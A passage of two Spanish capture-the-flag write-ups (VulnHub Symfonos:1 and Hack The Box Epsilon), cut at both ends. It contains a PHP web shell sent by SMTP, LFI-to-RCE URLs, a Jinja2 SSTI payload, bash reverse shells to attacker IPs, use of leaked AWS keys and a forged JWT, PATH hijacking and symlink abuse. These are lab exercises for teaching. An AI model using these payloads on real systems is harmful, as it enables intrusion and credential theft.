correo, para quien se envía y la data, vamos a probar:nc 172.26.75.241 25220 symfonos.localdomain ESMTP Postfix (Debian/GNU)MAIL FROM: grafis250 2.1.0 OkRCPT TO: helios250 2.1.5 Okdata354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;Probando.250 2.0.0 Ok: queued as 4F7C4406D7Veamos la web:Todo perfecto, vamos a enviar código php malicioso:nc 172.26.75.241 25220 symfonos.localdomain ESMTP Postfix (Debian/GNU)MAIL FROM: grafis250 2.1.0 OkRCPT TO: helios250 2.1.5 Okdata354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;&lt;?php                        echo \"&lt;pre&gt;\" . shell_exec($_GET['cmd']) . \"&lt;/pre&gt;\"; ?&gt;.250 2.0.0 Ok: queued as 41C10406D7Si vemos la web, no veremos nada, eso indica que nos debe estar interpretando el código, por lo tanto, vamos a intentar indicarle un valor para la variable cmd, en este caso debemos utilizar el operador &amp;:http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/spool/mail/helios&amp;cmd=idEfectivamente, tenemos RCE, vamos a ganar acceso a la máquina:http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/spool/mail/helios&amp;cmd=bash -c 'bash -i &gt;%26 /dev/tcp/172.26.70.49/1234 0&gt;%261'Enviamos y vamos a nuestro listener: nc -nvlp 1234listening on [any] 1234 ...connect to [172.26.70.49] from (UNKNOWN) [172.26.75.241] 47020bash: cannot set terminal process group (613): Inappropriate ioctl for devicebash: no job control in this shell&lt;h3l105/wp-content/plugins/mail-masta/inc/campaign$ whoamiwhoamiheliosBien, hemos ganado acceso a la máquina, vamos a hacer un tratamiento de la tty.Escalada de privilegiosCon eso listo, vamos a enumerar el sistema para encontrar algo de interés:helios@symfonos:/home/helios$ find / -perm -4000 2&gt;/dev/null/usr/lib/eject/dmcrypt-get-device/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign/usr/bin/passwd/usr/bin/gpasswd/usr/bin/newgrp/usr/bin/chsh/usr/bin/chfn/opt/statuscheck/bin/mount/bin/umount/bin/su/bin/pingSi buscamos por SUID, encontramos algo que nos llama la atención, /opt/statuscheck, vamos a ver que es:helios@symfonos:/home/helios$ /opt/statuscheckHTTP/1.1 200 OKDate: Fri, 16 Jun 2023 04:30:38 GMTServer: Apache/2.4.25 (Debian)Last-Modified: Sat, 29 Jun 2019 00:38:05 GMTETag: \"148-58c6b9bb3bc5b\"Accept-Ranges: bytesContent-Length: 328Vary: Accept-EncodingContent-Type: text/htmlVemos una respuesta de un servidor http, esto debe estar haciendolo utilizando una herramienta, vamos a listar los strings de este binario:helios@symfonos:/home/helios$ strings /opt/statuscheck/lib64/ld-linux-x86-64.so.2libc.so.6system__cxa_finalize__libc_start_main_ITM_deregisterTMCloneTable__gmon_start___Jv_RegisterClasses_ITM_registerTMCloneTableGLIBC_2.2.5curl -I HVemos que está utilizando curl para tramitar las peticiones a la web, lo curioso es que este archivo es SUID y está utilizando curl con su nombre relativo, por lo tanto, podríamos intentar hacer un path hijaking para elevar nuestro privilegio:helios@symfonos:/tmp$ nano curlhelios@symfonos:/tmp$ chmod 777 curlhelios@symfonos:/tmp$ lscurlhelios@symfonos:/tmp$ cat curlbash -pNos vamos al directorio tmp y creamos un archivo llamado curl que nos dará una consola con privilegios si se ejecuta. Vamos a cambiar nuestro PATH para que busque primero en el directorio tmp:helios@symfonos:/tmp$ export PATH=/tmp:$PATHEjecutamos:helios@symfonos:/tmp$ /opt/statuscheckbash-4.4# whoamirootHemos ganado acceso como root.bash-4.4# cat proof.txt         Congrats on rooting symfonos:1!                 \\ __--==/////////////[})))==*                 / \\ '          ,|                    `\\`\\      //|                             ,|                      \\ `\\  //,/'                           -~ |   )             _-~~~\\  |/ / |'|                       _-~  / ,  ((            /' )   | \\ / /'/                    _-~   _/_-~| (((            ;  /`  ' )/ /''                 _ -~     _-~ ,/' ) ))           `~~\\   `\\\\/'/|'           __--~~__--\\ _-~  _/, ((( ))            / ~~    \\ /~      __--~~  --~~  __/~  _-~ / ((\\~\\           |    )   | '      /        __--~~  \\-~~ _-~    `\\(\\    __--(   _/    |'\\     /     --~~   __--~' _-~ ~|     (  ((~~   __-~        \\~\\   /     ___---~~  ~~\\~~__--~       ~~\\~~~~~~   `\\-~      \\~\\ /           __--~~~'~~/                   ;\\ __.-~  ~-/      ~~~~~__\\__---~~ _..--._                   ;;;;;;;;'  /      ---~~~/_.-----.-~  _.._ ~\\                       ;;;;;;;'   /      ----~~/         `\\,~    `\\ \\                          ;;;;'     (      ---~~/         `:::|       `\\\\.                        |'  _      `----~~~~'      /      `:|        ()))),                  ______/\\/~    |                 /        /         (((((())            /~;;.____/;;'  /          ___.---(   `;;;/             )))'`))         / //  _;______;'------~~~~~    |;;/\\    /                ((   (         //  \\ \\                        /  |  \\;;,\\                 `          (&lt;_    \\ \\                    /',/-----'  _&gt;         \\_|     \\\\_                 //~;~~~~~~~~~                  \\_|               (,~~                                       \\~\\                                     ~~        Contact me via Twitter @zayotic to give feedback!¡Listo! Hemos terminado la intrusión.Nos vemos, hasta la próxima."
  },
  
  {
    "title": "Epsilon HTB Write-up",
    "url": "/posts/Epsilon/",
    "categories": "Write up, Hack The Box",
    "tags": "Enumeration, Web, Git, SSTI, Python, AWS, Scheduled job abuse, Symlink, JWT, Linux, Medium",
    "date": "2023-03-04 00:00:00 -0500",
    





    
    "snippet": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Epsilon, la cual tiene una dificultad media. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración d...",
    "content": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Epsilon, la cual tiene una dificultad media. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración del sistema.  Obtención de repositorio git.  Enumeración de AWS.  Descubrimiento de funciones lambda del servidor.  Creación de un JWT.  Bypass del panel de login.  SSTI.  Abuso de symlink.Reconocimiento y EnumeraciónEn primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando ping:ping -c 1 10.10.11.134PING 10.10.11.134 (10.10.11.134) 56(84) bytes of data.64 bytes from 10.10.11.134: icmp_seq=1 ttl=63 time=149 msSe observa que existe una correcta conexión con la máquina.Para realizar un reconocimiento activo se utilizará la herramienta nmap, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro -sS el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):sudo nmap -p- -sS -open --min-rate 5000 10.10.11.134 -oG PortAl finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:PORT     STATE SERVICE22/tcp   open  ssh80/tcp   open  http5000/tcp open  upnpRealizamos un escaneo de los servicios expuestos utilizando nmap:sudo nmap -sCV -p22,80,5000 10.10.11.134 -oN ServiceScanComo resultado del escaneo tenemos:PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)80/tcp   open  http    Apache httpd 2.4.41| http-git: |   10.10.11.134:80/.git/|     Git repository found!|     Repository description: Unnamed repository; edit this file 'description' to name the...|_    Last commit message: Updating Tracking API  # Please enter the commit message for...|_http-title: 403 Forbidden|_http-server-header: Apache/2.4.41 (Ubuntu)5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)|_http-title: Costume ShopService Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernelPodemos observar 2 servidores http, utilizando la herramienta whatweb vamos a ver si podemos sacar un poco de información extra:whatweb 10.10.11.134http://10.10.11.134 [403 Forbidden] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.134], Title[403 Forbidden]whatweb 10.10.11.134:5000http://10.10.11.134:5000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.8.10], IP[10.10.11.134], PasswordField[password], Python[3.8.10], Script, Title[Costume Shop], Werkzeug[2.0.2]Para la primera web no podemos ver mucho y la segunda web está utilizando python, lo que es interesante para pensar en futuros ataques que podríamos intentar.Vamos a revisar la web que está en el puerto 5000:Vemos un panel de autenticación, sin embargo, por el momento no tenemos niguna credencial que nos pueda servir y las típicas no funcionan.ExplotaciónAntes de intentar las injecciones vamos a revisar un archivo interesante que está en nuestra captura de nmap, el repositorio de git, para ello vamos a utilizar la herramienta git_dumper, disponible en github :python3 git_dumper.py http://10.10.11.134/.git paginaEn este caso vamos a guardar toda la información en la carpeta pagina. Luego de esperar a que termine la ejecución de la herramienta vamos a ver que ha encontrado:lsserver.py  track_api_CR_148.pyTenemos dos scripts en python, vamos a revisarlos:#!/usr/bin/python3import jwtfrom flask import *app = Flask(__name__)secret = '&lt;secret_key&gt;'def verify_jwt(token,key):\ttry:\t\tusername=jwt.decode(token,key,algorithms=['HS256',])['username']\t\tif username:\t\t\treturn True\t\telse:\t\t\treturn False\texcept:\t\treturn False@app.route(\"/\", methods=[\"GET\",\"POST\"])def index():\tif request.method==\"POST\":\t\tif request.form['username']==\"admin\" and request.form['password']==\"admin\":\t\t\tres = make_response()\t\t\tusername=request.form['username']\t\t\ttoken=jwt.encode({\"username\":\"admin\"},secret,algorithm=\"HS256\")\t\t\tres.set_cookie(\"auth\",token)\t\t\tres.headers['location']='/home'\t\t\treturn res,302\t\telse:\t\t\treturn render_template('index.html')\telse:\t\treturn render_template('index.html')@app.route(\"/home\")def home():\tif verify_jwt(request.cookies.get('auth'),secret):\t\treturn render_template('home.html')\telse:\t\treturn redirect('/',code=302)@app.route(\"/track\",methods=[\"GET\",\"POST\"])def track():\tif request.method==\"POST\":\t\tif verify_jwt(request.cookies.get('auth'),secret):\t\t\treturn render_template('track.html',message=True)\t\telse:\t\t\treturn redirect('/',code=302)\telse:\t\treturn render_template('track.html')@app.route('/order',methods=[\"GET\",\"POST\"])def order():\tif verify_jwt(request.cookies.get('auth'),secret):\t\tif request.method==\"POST\":\t\t\tcostume=request.form[\"costume\"]\t\t\tmessage = '''\t\t\tYour order of \"{}\" has been placed successfully.\t\t\t'''.format(costume)\t\t\ttmpl=render_template_string(message,costume=costume)\t\t\treturn render_template('order.html',message=tmpl)\t\telse:\t\t\treturn render_template('order.html')\telse:\t\treturn redirect('/',code=302)app.run(debug='true')El primer código podemos ver que corresponde al servidor, en este caso está utilizando Flask, lo cual es interesante pues podría ser vulnerable a SSTI. Luego, podemos observar las rutas de la página, las cuales verifican la existencia de un JWT (Json Web Token), podríamos contruir este JWT para utilizarlo para ingresar a la web, sin embargo, no disponemos del “secret”.Vamos a revisar el segundo script:import ioimport osfrom zipfile import ZipFilefrom boto3.session import Sessionsession = Session(    aws_access_key_id='&lt;aws_access_key_id&gt;',    aws_secret_access_key='&lt;aws_secret_access_key&gt;',    region_name='us-east-1',    endpoint_url='http://cloud.epsilon.htb')aws_lambda = session.client('lambda')def files_to_zip(path):    for root, dirs, files in os.walk(path):        for f in files:            full_path = os.path.join(root, f)            archive_name = full_path[len(path) + len(os.sep):]            yield full_path, archive_namedef make_zip_file_bytes(path):    buf = io.BytesIO()    with ZipFile(buf, 'w') as z:        for full_path, archive_name in files_to_zip(path=path):            z.write(full_path, archive_name)    return buf.getvalue()def update_lambda(lambda_name, lambda_code_path):    if not os.path.isdir(lambda_code_path):        raise ValueError('Lambda directory does not exist: {0}'.format(lambda_code_path))    aws_lambda.update_function_code(        FunctionName=lambda_name,        ZipFile=make_zip_file_bytes(path=lambda_code_path))Observamos que está utilizando aws, el cual se está conectando a un endpoint llamado cloud.epsilon.htb, al final del código podemos observar la utilización de funciones lambda, las cuales según la página oficial de aws son “un servicio informático que permite ejecutar código sin aprovisionar ni administrar servidores.”, por lo tanto, podemos pensar que está ejecutando código por detrás, vamos a buscar alguna forma de encontrar esta función lambda. Para ello vamos a utilizar el servicio de aws-cli, vamos a descargarlo desde la página_oficial de AWS:aws --versionaws-cli/2.11.0 Python/3.11.2 Linux/6.0.0-kali6-amd64 exe/x86_64.kali.2022 prompt/offLuego, teniendo ya listo lo anterior, vamos a intentar conectarnos al endpoint que vimos anteriormente, el primer paso corresponde agregar esta dirección en el /etc/hosts para que pueda resolver correctamente a la IP:127.0.0.1       localhost127.0.1.1       kali::1             localhost ip6-localhost ip6-loopbackff02::1         ip6-allnodesff02::2         ip6-allrouters10.10.11.134    epsilon.htb cloud.epsilon.htbCon esto listo, necesitamos configurar nuestra sesión, para ello haremos lo siguiente:aws configureAWS Access Key ID [None]: Vemos que está pidiendo un AWS access key ID, la cual no disponemos, sin embargo, si volvemos al código en python podemos ver que se mencionan:session = Session(    aws_access_key_id='&lt;aws_access_key_id&gt;',    aws_secret_access_key='&lt;aws_secret_access_key&gt;',    region_name='us-east-1',    endpoint_url='http://cloud.epsilon.htb')aws_lambda = session.client('lambda')Pero no están allí, aunque tenemos que recordar que estamos en un repositorio de git, puede darse el caso en que versiones anteriores del proyecto podamos encontrar información sobre esto, para ello hacemos lo siguiente:git logcommit c622771686bd74c16ece91193d29f85b5f9ffa91 (HEAD -&gt; master)Author: root &lt;root@epsilon.htb&gt;Date:   Wed Nov 17 17:41:07 2021 +0000    Fixed Typocommit b10dd06d56ac760efbbb5d254ea43bf9beb56d2dAuthor: root &lt;root@epsilon.htb&gt;Date:   Wed Nov 17 10:02:59 2021 +0000    Adding Costume Sitecommit c51441640fd25e9fba42725147595b5918eba0f1Author: root &lt;root@epsilon.htb&gt;Date:   Wed Nov 17 10:00:58 2021 +0000    Updatig Tracking APIcommit 7cf92a7a09e523c1c667d13847c9ba22464412f3Author: root &lt;root@epsilon.htb&gt;Date:   Wed Nov 17 10:00:28 2021 +0000    Adding Tracking API ModuleObservamos todos los commit disponibles del proyecto, vemos uno interesante llamado Adding Tracking API Module, el cual fue antes que lo actualizaran asi que vamos a ver que encontramos:git show 7cf92a7a09e523c1c667d13847c9ba22464412f3commit 7cf92a7a09e523c1c667d13847c9ba22464412f3Author: root &lt;root@epsilon.htb&gt;Date:   Wed Nov 17 10:00:28 2021 +0000    Adding Tracking API Modulediff --git a/track_api_CR_148.py b/track_api_CR_148.pynew file mode 100644index 0000000..fed7ab9--- /dev/null+++ b/track_api_CR_148.py@@ -0,0 +1,36 @@+import io+import os+from zipfile import ZipFile+from boto3.session import Session+++session = Session(+    aws_access_key_id='AQLA5M37BDN6FJP76TDC',+    aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A',+    region_name='us-east-1',+    endpoint_url='http://cloud.epsilong.htb')+aws_lambda = session.client('lambda')    +Vemos las key, por lo tanto, vamos a intentar utilizarlas para configurar la sesión e intentar conectarnos al endpoint para enumerar las funciones lambda:aws configureAWS Access Key ID [None]: AQLA5M37BDN6FJP76TDCAWS Secret Access Key [None]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1ADefault region name [None]: us-east-1Default output format [None]: jsonTenemos listas las credenciales, vamos a intentar conectarnos al endpoint, si vemos el panel de ayuda:GLOBAL OPTIONS       --debug (boolean)       Turn on debug logging.       --endpoint-url (string)Tenemos un parámetro para el endpoint, vamos a utilizarlo:aws --endpoint-url=http://cloud.epsilon.htbusage: aws [options] &lt;command&gt; &lt;subcommand&gt; [&lt;subcommand&gt; ...] [parameters]To see help text, you can run:  aws help  aws &lt;command&gt; help  aws &lt;command&gt; &lt;subcommand&gt; helpaws: error: the following arguments are required: commandVemos que necesitamos ingresar un comando, para ello vamos a hacer caso y buscaremos en la sección de ayuda:       o lambdaVemos que hay un comando lambda, vamos a utilizarlo:aws --endpoint-url=http://cloud.epsilon.htb lambdausage: aws [options] &lt;command&gt; &lt;subcommand&gt; [&lt;subcommand&gt; ...] [parameters]To see help text, you can run:  aws help  aws &lt;command&gt; help  aws &lt;command&gt; &lt;subcommand&gt; helpaws: error: the following arguments are required: operationVamos a buscar formas de enumerar las funciones lambda en el panel de ayuda:       o list-functionsVemos un comando llamado list-functions, esto es lo que necesitamos para ver qué funciones lambda se están ejecutando:{    \"Functions\": [        {            \"FunctionName\": \"costume_shop_v1\",            \"FunctionArn\": \"arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1\",            \"Runtime\": \"python3.7\",            \"Role\": \"arn:aws:iam::123456789012:role/service-role/dev\",            \"Handler\": \"my-function.handler\",            \"CodeSize\": 478,            \"Description\": \"\",            \"Timeout\": 3,            \"LastModified\": \"2023-03-04T20:19:54.134+0000\",            \"CodeSha256\": \"IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=\",            \"Version\": \"$LATEST\",            \"VpcConfig\": {},            \"TracingConfig\": {                \"Mode\": \"PassThrough\"            },            \"RevisionId\": \"be8c779f-bcbd-44ee-abbd-905c32d7aece\",            \"State\": \"Active\",            \"LastUpdateStatus\": \"Successful\",            \"PackageType\": \"Zip\"        }    ]}Vemos que existe una función lambda llamada costume_shop_v1, como ya tenemos el nombre de la función lambda que se está aplicando vamos a intentar ver qué tiene dentro, para ello vamos a buscar en el panel de ayuda:o get-functionEncontramos el comando get-function, vamos a utilizarlo:ws --endpoint-url=http://cloud.epsilon.htb lambda get-functionusage: aws [options] &lt;command&gt; &lt;subcommand&gt; [&lt;subcommand&gt; ...] [parameters]To see help text, you can run:  aws help  aws &lt;command&gt; help  aws &lt;command&gt; &lt;subcommand&gt; helpaws: error: the following arguments are required: --function-namePero claro, tenemos que especificarle qué función queremos obtener asi que buscaremos en el panel de ayuda:OPTIONS       --function-name (string)          The name of the Lambda function, version, or alias.              Name formatsVemos que existe –function-name, así que vamos a utilizar este parámetro para definir el nombre de la función:aws --endpoint-url=http://cloud.epsilon.htb lambda get-function --function-name=costume_shop_v1{    \"Configuration\": {        \"FunctionName\": \"costume_shop_v1\",        \"FunctionArn\": \"arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1\",        \"Runtime\": \"python3.7\",        \"Role\": \"arn:aws:iam::123456789012:role/service-role/dev\",        \"Handler\": \"my-function.handler\",        \"CodeSize\": 478,        \"Description\": \"\",        \"Timeout\": 3,        \"LastModified\": \"2023-03-04T20:19:54.134+0000\",        \"CodeSha256\": \"IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=\",        \"Version\": \"$LATEST\",        \"VpcConfig\": {},        \"TracingConfig\": {            \"Mode\": \"PassThrough\"        },        \"RevisionId\": \"be8c779f-bcbd-44ee-abbd-905c32d7aece\",        \"State\": \"Active\",        \"LastUpdateStatus\": \"Successful\",        \"PackageType\": \"Zip\"    },    \"Code\": {        \"Location\": \"http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code\"    },    \"Tags\": {}}Encontramos la localización de esta función, vamos a obtenerla:wget http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/codeLuego, vemos el resultado:file codecode: Zip archive data, at least v2.0 to extract, compression method=deflateTenemos un archivo zip, vamos a descomprimirlo:unzip codeArchive:  code  inflating: lambda_function.pyVeamos que contiene este script en python:import jsonsecret='RrXCv`mrNe!K!4+5`wYq' #apigateway authorization for CR-124'''Beta release for tracking'''def lambda_handler(event, context):    try:        id=event['queryStringParameters']['order_id']        if id:            return {               'statusCode': 200,               'body': json.dumps(str(resp)) #dynamodb tracking for CR-342            }        else:            return {                'statusCode': 500,                'body': json.dumps('Invalid Order ID')            }    except:        return {                'statusCode': 500,                'body': json.dumps('Invalid Order ID')            }Aquí podemos ver la función que se está empleando, y vemos algo que necesitabamos anteriormente, tenemos el secret, con esto podemos creanos un JWT para poder logearnos en la web sin necesidad de ingresar la contraseña, por lo tanto, vamos a crear este token con python:import jwtsecret='RrXCv`mrNe!K!4+5`wYq'print(jwt.encode({\"username\":\"admin\"},secret,algorithm=\"HS256\"))Si lo ejecutamos:python3 py.pyeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4Vemos que hemos creado el token, vamos a intentar logearnos en la web, para ello cambiaremos nuestra cookie de sesión por el JWT:Vamos a agregar un nuevo item:Si nos fijamos en el server.py:def index():\tif request.method==\"POST\":\t\tif request.form['username']==\"admin\" and request.form['password']==\"admin\":\t\t\tres = make_response()\t\t\tusername=request.form['username']\t\t\ttoken=jwt.encode({\"username\":\"admin\"},secret,algorithm=\"HS256\")\t\t\tres.set_cookie(\"auth\",token)\t\t\tres.headers['location']='/home'\t\t\treturn res,302\t\telse:\t\t\treturn render_template('index.html')\telse:\t\treturn render_template('index.html')Tenemos que el nombre de la cookie es auth, así que vamos a agregarle ese nombre y dentro de value ingresamos el JWT:Con esto listo, vamos a intentar ingresar a /home, pues es donde se nos redirige:Vemos que ha funcionado correctamente y estamos logeados como el usuario admin dentro de la web.Vamos a inspeccionar la web para ver que encontramos:Dentro de la sección de ordenes podemos este panel, vamos a hacer algunas pruebas:Enviamos:Vemos que se ha registrado nuestra orden de glasses, vamos a analizar esto por Burpsuite:Vemos que existe un parámetro que se envía con el nombre del producto que queremos comprar, vamos a ver si podemos cambiarlo:Vemos que nuetro imput se puede ver en la web, esto nos abre la posibilidad a lo escrito anteriormente, veremos si es vulnerable a SSTI, pues se está utilizando Flask, por lo tanto, podría ser vulnerable:Efectivamente, es vulnerable a SSTI, si vamos al github de PayloadsAllTheThings encontramos bastante información sobre SSTI, como estamos trabajando con python utilizaremos jinja2 como en ocasiones anteriores, utilizaremos este (sin el backslash):{\\{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}Vemos que tenemos RCE, vamos a ganar acceso al sistema, esto lo realizaremos como siempre. En primer lugar, tendremos el siguiente archivo llamado index.html:#!/bin/bashbash -i &gt;&amp; /dev/tcp/10.10.14.17/1234 0&gt;&amp;1El cual nos permitirá ganar acceso al sistema, vamos a compartir este archivo a través de un servidor http con python, y desde la máquina víctima haremos una petición a este archivo y luego lo ejecutaremos para ganar acceso mediante nuestro netcat en escucha, vamos al Burpsuite:Si enviamos la petición y vemos nuestro servidor de python:python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.11.134 - - [04/Mar/2023 23:22:08] \"GET / HTTP/1.1\" 200 -Vemos una petición, si vamos a nuestro listener:nc -nvlp 1234listening on [any] 1234 ...connect to [10.10.14.17] from (UNKNOWN) [10.10.11.134] 57430bash: cannot set terminal process group (948): Inappropriate ioctl for devicebash: no job control in this shelltom@epsilon:/var/www/app$ whoamiwhoamitomHemos ganado acceso a la máquina, vamos a buscar la flag de usuario:tom@epsilon:~$ cat user.txtcat user.txt68dbffa66652ccd6a97¡Bien!, tenemos la flag, ahora debemos escalar privilegios.Escalada de privilegiosEl primer paso será arreglar la terminal, para ello vamos a ejecutar los siguiente comandos:  script /dev/null -c bash  control + z  stty ray -echo; fg  reset xterm  export TERM=xterm  export SHELL=bash  stty rows X columns Y (dependiendo de tu stty size)De esta forma obtenemos una tty más cómoda.Bien, vamos a ver los privilegios que tenemos dentro de la máquina:tom@epsilon:/home$ sudo -l[sudo] password for tom: tom@epsilon:/home$ find / -perm -4000 2&gt;/dev/null/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/openssh/ssh-keysign/usr/bin/mount/usr/bin/sudo/usr/bin/pkexec/usr/bin/gpasswd/usr/bin/umount/usr/bin/passwd/usr/bin/fusermount/usr/bin/chsh/usr/bin/at/usr/bin/chfn/usr/bin/newgrp/usr/bin/suNo tenemos la contraseña del usuario asi que no podemos ver los privilegios, no encontramos nada extraño en los permisos SUID, vamos a ignorar el pkexec que está allí.# /etc/crontab: system-wide crontab# Unlike any other crontab you don't have to run the `crontab'# command to install the new version when you edit this file# and files in /etc/cron.d. These files also have username fields,# that none of the other crontabs do.SHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin# Example of job definition:# .---------------- minute (0 - 59)# |  .------------- hour (0 - 23)# |  |  .---------- day of month (1 - 31)# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat# |  |  |  |  |# *  *  *  *  * user-name command to be executed17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )No vemos a tareas cron por aquí.Vamos a utilizar una herramienta llamada pspy que nos ayudará a encontrar procesos que se estén ejecutando por parte de root en el sistema, vamos a clonar el repositorio y compilarlo:sudo /usr/local/go/bin/go build -ldflags \"-s -w\" .go: downloading github.com/spf13/cobra v1.4.0go: downloading golang.org/x/sys v0.0.0-20220520151302-bc2c85ada10aLuego, abrimos un servidor http con python y desde la máquina víctima descargarmos el archivo:tom@epsilon:/tmp$ wget http://10.10.14.17/pspy--2023-03-05 04:48:17--  http://10.10.14.17/pspyConnecting to 10.10.14.17:80... connected.HTTP request sent, awaiting response... 200 OKLength: 3252224 (3.1M) [application/octet-stream]Saving to: ‘pspy’pspy                100%[===================&gt;]   3.10M  1.33MB/s    in 2.3s    2023-03-05 04:48:19 (1.33 MB/s) - ‘pspy’ saved [3252224/3252224]tom@epsilon:/tmp$ lspspyLe damos permisos se ejecución y lo ejecutamos:tom@epsilon:/tmp$ chmod +x pspytom@epsilon:/tmp$ ./pspy./pspy: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by ./pspy)./pspy: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./pspy)Sin embargo, no nos ha funcionado, vamos a solucionarlo buscando los binarios en el github de la herramienta:Vamos a descargar el pspy64 y lo vamos a compartir de la misma forma con el servidor http:tom@epsilon:/tmp$ wget http://10.10.14.17/pspy64--2023-03-05 04:58:39--  http://10.10.14.17/pspy64Connecting to 10.10.14.17:80... connected.HTTP request sent, awaiting response... 200 OKLength: 3104768 (3.0M) [application/octet-stream]Saving to: ‘pspy64’pspy64              100%[===================&gt;]   2.96M  1.28MB/s    in 2.3s    2023-03-05 04:58:42 (1.28 MB/s) - ‘pspy64’ saved [3104768/3104768]tom@epsilon:/tmp$ chmod +x pspy64tom@epsilon:/tmp$ ./pspy64Y ahora:spy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d     ██▓███    ██████  ██▓███ ▓██   ██▓    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒     ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░     ░░       ░  ░  ░  ░░       ▒ ▒ ░░                     ░           ░ ░                                    ░ ░     Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)Draining file system events due to startup...Mientras se ejecuta vemos algo interesante:2023/03/05 04:59:01 CMD: UID=0     PID=10156  | /bin/bash /usr/bin/backup.sh 2023/03/05 04:59:01 CMD: UID=0     PID=10157  | /usr/bin/tar -cvf /opt/backups/606036422.tar /var/www/app/ 2023/03/05 04:59:01 CMD: UID=0     PID=10159  | /bin/bash /usr/bin/backup.sh 2023/03/05 04:59:01 CMD: UID=0     PID=10158  | /bin/bash /usr/bin/backup.sh 2023/03/05 04:59:01 CMD: UID=0     PID=10160  | /bin/bash /usr/bin/backup.sh Vemos que root está ejecutando el archivo backup.sh, vamos a ver que es:#!/bin/bashfile=`date +%N`/usr/bin/rm -rf /opt/backups/*/usr/bin/tar -cvf \"/opt/backups/$file.tar\" /var/www/app/sha1sum \"/opt/backups/$file.tar\" | cut -d ' ' -f1 &gt; /opt/backups/checksumsleep 5check_file=`date +%N`/usr/bin/tar -chvf \"/var/backups/web_backups/${check_file}.tar\" /opt/backups/checksum \"/opt/backups/$file.tar\"/usr/bin/rm -rf /opt/backups/*Vemos que en primer lugar borra todo lo existente en /opt/backups, luego de esto crea un archivo .tar que tendrá dentro todo lo que está en /var/www/app, luego envía el hash de este archivo tar a la ruta /opt/backups/checksum. Podemos ver que finalmente utiliza tar para comprimir el archivo con el checksum creado junto con el mismo archivo tar inicial, lo importante aquí es una flag que está utilizando la cual es -h, esta permite hacer un seguimiento del los enlaces simbólicos, lo que nos va a permitir hacer lo siguiente.Como podemos eliminar y crear el archivo checksum, lo que haremos será que mientras que el código esté en el sleep 5, borraremos el archivo checksum y lo reemplazaremos por otro, el cual tendrá un symlink hacia la id_rsa de root, dentro del directorio /root/.ssh, de esta forma vamos a tener un nuevo archivo tar final modificado, el cual al descomprimirlo, entregará los datos 